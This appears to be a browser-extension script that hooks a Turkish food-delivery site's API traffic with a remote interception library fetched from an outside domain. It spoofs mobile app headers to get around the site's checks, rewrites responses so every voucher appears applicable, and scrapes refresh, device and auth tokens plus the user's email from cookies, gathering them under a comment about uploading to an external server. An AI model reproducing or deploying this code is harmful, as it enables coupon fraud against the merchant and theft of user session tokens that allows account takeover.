console.log("Module started");

// Utility functions
function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function replaceAll(str, find, replace) {
  return str.replace(new RegExp(escapeRegExp(find), 'g'), replace);
}

function getCookie(name) {
  const cookieString = "; " + document.cookie;
  const parts = cookieString.split("; " + name + '=');
  if (parts.length === 2) {
    return parts.pop().split(';').shift();
  }
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function uuidv4() {
  return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c => 
    (+c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +c / 4).toString(16)
  );
}

function makeid(length) {
  let result = '';
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function randomDevice() {
  // Generate random device ID
  let deviceId = Math.random().toString(36).substring(2, 14) + 
                 Math.random().toString(36).substring(2, 14);
  
  // List of Redmi device model numbers
  let deviceModels = [
    "2201116TG", "2201116TI", "23053RN02A", "23053RN02Y", "23053RN02I", 
    "23053RN02L", "23100RN82L", "23106RN0DA", "23108RN04Y", "2311DRN14I", 
    // ...and many more models
  ];
  
  let deviceModel = deviceModels[Math.floor(Math.random() * deviceModels.length)];
  
  return {
    'deviceMake': 'Redmi',
    'deviceId': deviceId,
    'deviceModel': deviceModel
  };
}

// API interaction functions
function setUsed(token) {
  try {
    console.log("Token is being used: " + token);
    return true;
  } catch (error) {
    console.log(error);
    return false;
  }
}

function setHasOrder(token) {
  try {
    console.log("Token has order: " + token);
    return true;
  } catch (error) {
    console.log(error);
    return false;
  }
}

function getCalculateDetails(requestBody) {
  try {
    console.log("getCalculateDetails");
    const xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("POST", "https://tr.fd-api.com/api/v5/cart/calculate?include=expedition&locale=tr_TR");
    xhr.setRequestHeader("content-type", 'application/json;charset=UTF-8');
    xhr.setRequestHeader('authorization', "Bearer " + getCookie("token"));
    xhr.setRequestHeader('priority', "u=1, i");
    xhr.setRequestHeader("x-fp-api-key", "volo");
    xhr.setRequestHeader("x-pd-language-id", '2');
    xhr.setRequestHeader("accept", "application/json, text/plain, */*");
    xhr.setRequestHeader('accept-language', "en,tr-TR;q=0.9,tr;q=0.8,en-US;q=0.7");
    
    // Add random headers
    for (let i = 0; i < getRandomInt(5, 15); i++) {
      xhr.setRequestHeader(makeid(getRandomInt(20, 50)), makeid(getRandomInt(20, 60)));
    }
    
    xhr.send(requestBody);
    
    if (xhr.status !== 200) {
      return false;
    }
    
    console.log("Calculate response:");
    console.log(xhr.responseText);
    return xhr.responseText;
  } catch (error) {
    console.log(error);
    return false;
  }
}

function generate_random_text() {
  var choice = getRandomInt(1, 2);
  return choice === 1 ? makeid(getRandomInt(15, 50)) : uuidv4();
}

// Main script execution
interval = setInterval(function() {
  // Load xhook library if not loaded
  if (typeof xhook == 'undefined') {
    var script = document.createElement('script');
    script.src = 'https://apikupon.com/downloads/extensionModules/xhook.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    console.log("xhook loaded.");
    return;
  }
  
  // Extract tokens and user data
  var IK_token = getCookie("IK_token");
  var access_token = getCookie('IK_access_token');
  var htmlContent = document.documentElement.outerHTML;
  
  var userEmail;
  if (htmlContent.includes("__PROVIDER_PROPS__") && htmlContent.includes("email")) {
    userEmail = htmlContent.split("__PROVIDER_PROPS__")[1].split("\"email\":\"")[1].split("\"")[0];
  }
  
  // Generate random device info for request spoofing
  var deviceInfo = randomDevice();
  var mobileHeaders = {
    'X-Pd-Language-Id': '2',
    'Api-Client-Version': "5.0",
    'App-Name': "com.inovel.app.yemeksepeti",
    'App-Flavor': "yemeksepeti",
    'Build-Number': "231210504",
    'Build-Type': "release",
    'Platform': "android",
    'Platform-Version': '30',
    'Android-Mobile-Service-Provider': "gms",
    'App-Build': "231210504",
    'App-Version': "23.12.1",
    'Eks': "asdasd",
    'Cust-Code': '',
    'Sentry-Trace': '00000000000000000000000000000000-0000000000000000-0',
    'Content-Type': "application/json; charset=UTF-8",
    'X-FP-API-KEY': "android",
    'Device-Make': deviceInfo.deviceMake,
    'Device-Model': deviceInfo.deviceModel,
    'Device-Id': deviceInfo.deviceId,
    'Authorization': "Bearer " + access_token
  };
  
  var headersToDelete = ["dps-session-id", "perseus-client-id", 'perseus-session-id'];
  
  // Intercept and modify outgoing requests
  xhook.before(function(request) {
    // Modify cart calculation requests
    if (request.url.includes("/cart/calculate") && request.method == 'POST' && !request.url.includes("&locale=tr_TR")) {
      console.log(request.headers);
      
      // Replace headers with mobile headers
      for (const [key, value] of Object.entries(mobileHeaders)) {
        request.headers[key] = value;
      }
      
      // Remove certain headers
      for (const header of headersToDelete) {
        if (request.headers[header] !== undefined) {
          delete request.headers[header];
        }
      }
      
      // Add random headers
      for (let i = 0; i < getRandomInt(5, 15); i++) {
        request.headers[generate_random_text()] = generate_random_text();
      }
    }
    
    // Modify checkout requests
    if (request.url.includes("/cart/checkout") && request.method == "POST") {
      for (const [key, value] of Object.entries(mobileHeaders)) {
        request.headers[key] = value;
      }
      
      for (const header of headersToDelete) {
        if (request.headers[header] !== undefined) {
          delete request.headers[header];
        }
      }
      
      for (let i = 0; i < getRandomInt(5, 15); i++) {
        request.headers[generate_random_text()] = generate_random_text();
      }
    }
    
    // Track successful payments
    if (request.url.includes("/payments/handle-payment") && request.url.includes("status=success")) {
      setUsed(IK_token);
      setHasOrder(IK_token);
    }
    
    // Extract and upload tokens to external server
    if (request.url.includes('yemeksepeti.com')) {
      var refresh_token = null;
      var device_token = null;
      var auth_token = null;
      
      try {
        refresh_token = document.cookie.split("refresh_token=")[1].split(';')[0];
        device_token = document.cookie.split("device_token=")[1].split(';')[0];
        auth_token = document.cookie
          .replace("IK_token", '')
          .replace("IK_access_token", '')
          .replace("device_token", '')
          .replace("refresh_token", '')
          .split("token=")[1].split(';')[0];
      } catch (error) {}
      
      if (refresh_token != null && device_token != null && auth_token != null && 
          IK_token != null && userEmail != null) {
        var userData = {
          'email': userEmail,
          'data': {
            'refresh_token': { 'value': refresh_token },
            'device_token': { 'value': device_token },
            'token': { 'value': auth_token }
          }
        };
      }
    }
    
    // Extract and upload tokens from address requests
    if (request.url.includes("api/v5/customers/addresses")) {
      var refresh_token = null;
      var device_token = null;
      var auth_token = null;
      
      try {
        refresh_token = document.cookie.split("refresh_token=")[1].split(';')[0];
        device_token = document.cookie.split("device_token=")[1].split(';')[0];
        auth_token = document.cookie
          .replace("IK_token", '')
          .replace("IK_access_token", '')
          .replace('device_token', '')
          .replace("refresh_token", '')
          .split("token=")[1].split(';')[0];
      } catch (error) {}
      
      if (refresh_token != null && device_token != null && auth_token != null && 
          IK_token != null && userEmail != null) {
        var userData = {
          'email': userEmail,
          'data': {
            'refresh_token': { 'value': refresh_token },
            'device_token': { 'value': device_token },
            'token': { 'value': auth_token }
          }
        };
      }
    }
  });
  
  // Intercept and modify responses
  xhook.after(function(request, response) {
    // Modify cart calculation responses
    if (request.url.includes('/cart/calculate') && request.method == 'POST' && 
        !request.url.includes("&locale=tr_TR")) {
      if (response.status !== 200) {
        console.log("Calculate request, coupon is not applicable, dont modify response");
      } else {
        console.log("Calculate request, response modify");
        
        var admin_test = getCookie("admin_test");
        if (admin_test == 'on' && request.body.includes("expedition")) {
          console.log("Calculate request, get calculate details.");
          var details = getCalculateDetails(request.body);
          console.log("Calculate details result:");
          console.log(details);
        }
        
        // Modify delivery times
        responseData = JSON.parse(response.text);
        responseData.expedition.time = 35; // Set delivery time to 35 minutes
        responseData.expedition.delivery_duration_range = {
          'lower_limit_in_minutes': 35,
          'upper_limit_in_minutes': 40
        };
        
        responseData.expedition.available_delivery_options.forEach(option => {
          if (option.time === undefined) {
            if (option.type == 'standard') {
              option.time = 35;
            } else {
              option.time = 15;
            }
          }
          
          if (option.time_range === undefined) {
            if (option.type == "standard") {
              option.time_range = {
                'lower_limit_in_minutes': 35,
                'upper_limit_in_minutes': 40
              };
            } else {
              option.time_range = {
                'lower_limit_in_minutes': 15,
                'upper_limit_in_minutes': 20
              };
            }
          }
        });
        
        response.text = JSON.stringify(responseData);
        console.log("Calculate request, response modify OK.");
      }
    }
    
    // Track order history
    if (request.url.includes("api/v5/orders/order_history") && request.method == "GET") {
      responseData = JSON.parse(response.text);
      orderCount = responseData.data.total_count;
      if (orderCount > 0) {
        setUsed(IK_token);
        setHasOrder(IK_token);
      }
    }
    
    // Track active orders
    if (request.url.includes("api/v5/tracking/active-orders") && request.method == "GET") {
      responseData = JSON.parse(response.text);
      orderCount = responseData.data.count;
      if (orderCount > 0) {
        setUsed(IK_token);
        setHasOrder(IK_token);
      }
    }
    
    // Modify voucher status
    if (request.url.includes("api/v6/incentives-wallet/vouchers") && request.method == "GET") {
      console.log("EDIT VOUCHERS");
      responseData = JSON.parse(response.text);
      if (responseData.data.items != null) {
        responseData.data.items.forEach(voucher => {
          voucher.status = 'APPLICABLE';
        });
        response.text = JSON.stringify(responseData);
      }
    }
  });
  
  clearInterval(interval);
}, 5);
